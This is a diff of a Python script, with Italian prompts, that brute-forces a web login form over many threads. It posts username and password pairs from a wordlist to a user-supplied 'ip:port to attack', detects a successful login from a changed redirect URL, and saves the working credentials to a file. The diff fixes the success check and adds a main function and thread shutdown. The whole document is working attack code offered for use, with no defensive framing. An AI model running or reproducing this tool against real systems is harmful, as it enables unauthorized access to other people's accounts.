@@ -1,4 +1,4 @@
-import requests,os,sys
+import requests,os,sys,time
 from threading import Thread
 listT = []
 class MyThread(Thread):
@@ -17,7 +17,7 @@ class MyThread(Thread):
                     payload["username"] = x.strip()
                     print(x.strip(),y.strip())
                     r = requests.post(self.url,data=payload)
-                    if str(r.url) != url:
+                    if str(r.url) != self.url:
                         os.system("cls")
                         f = open("url.txt","w")
                         print(f"user --> {payload['username']}\npassword --> {payload['password']}\nurl --> {r.url}",file=f)
@@ -30,21 +30,31 @@ class MyThread(Thread):
     def stop(self):
         self.ferma = True
         print("mi fermo")
-        sys.exit()
         
-try:
+def main():
     f = open("pass.txt","r")
     stringa = f.readlines()
     f.close()
     numT = int(input("Quanti thread vuoi usare: "))
     lung = len(stringa)/numT
     url = str("".join(["http://"+input("Inserisci l'ip e porta da attaccare [ip:port]: ")+"/"]).replace(" ",""))
-    print(f"Faccio brute force su {url}")   
-    for i in range(numT):
-            listT.append(MyThread(url,stringa[int(i*lung):int(lung*i+lung)].copy(),stringa.copy()))
-            listT[-1].start()
-except Exception as e:
-    print(f"Errore:\n{e}\n")
-finally:
-    for th in listT:
-        th.join()
+    print(f"Faccio brute force su {url}") 
+    time.sleep(2)  
+    os.system("cls")
+    try:
+        for i in range(numT):
+                listT.append(MyThread(url,stringa[int(i*lung):int(lung*i+lung)].copy(),stringa.copy()))
+                listT[-1].start()
+        ok = True
+        while ok:
+            for x in listT:
+                if x.ferma: 
+                    for cella in listT.copy():
+                        cella.stop()
+                        cella.join()
+                        ok = False
+        sys.exit()
+    except Exception as e:
+        print(f"Errore:\n{e}\n")
+        
+if __name__=="__main__":main()
